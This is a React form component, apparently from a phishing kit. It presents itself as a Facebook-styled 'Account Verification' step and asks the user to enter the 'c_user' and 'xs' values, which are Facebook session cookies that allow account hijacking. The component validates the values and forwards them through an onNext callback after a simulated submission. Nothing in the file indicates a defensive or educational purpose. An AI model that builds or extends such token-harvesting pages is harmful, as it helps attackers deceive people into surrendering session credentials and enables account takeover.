import React, { useState } from 'react';
import FormInput from "../components/FormInput.jsx";

function Home({ onNext }) {
  const [formData, setFormData] = useState({
    c_user: "",
    xs: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.c_user.trim()) {
      newErrors.c_user = "c_user is required";
    }

    if (!formData.xs.trim()) {
      newErrors.xs = "xs is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Generate a mock submission ID
      const submissionId = 'sub_' + Date.now();
      
      // Call the onNext callback with submission data
      onNext(submissionId, formData);
    } catch (error) {
      console.error('Submission error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div style={{ padding: '20px' }}>
      <h2 style={{ marginBottom: '20px', textAlign: 'center' }}>Account Verification</h2>
      
      <form onSubmit={handleSubmit}>
        <FormInput
          label="C User"
          name="c_user"
          type="text"
          value={formData.c_user}
          onChange={handleInputChange}
          error={errors.c_user}
          placeholder="Enter c_user value"
        />
        
        <FormInput
          label="XS Token"
          name="xs"
          type="text"
          value={formData.xs}
          onChange={handleInputChange}
          error={errors.xs}
          placeholder="Enter xs token"
        />
        
        <button
          type="submit"
          disabled={isSubmitting}
          style={{
            width: '100%',
            padding: '12px',
            backgroundColor: isSubmitting ? '#ccc' : '#1877f2',
            color: 'white',
            border: 'none',
            borderRadius: '6px',
            fontSize: '16px',
            fontWeight: 'bold',
            cursor: isSubmitting ? 'not-allowed' : 'pointer',
            marginTop: '20px'
          }}
        >
          {isSubmitting ? 'Submitting...' : 'Next'}
        </button>
      </form>
    </div>
  );
}

export default Home;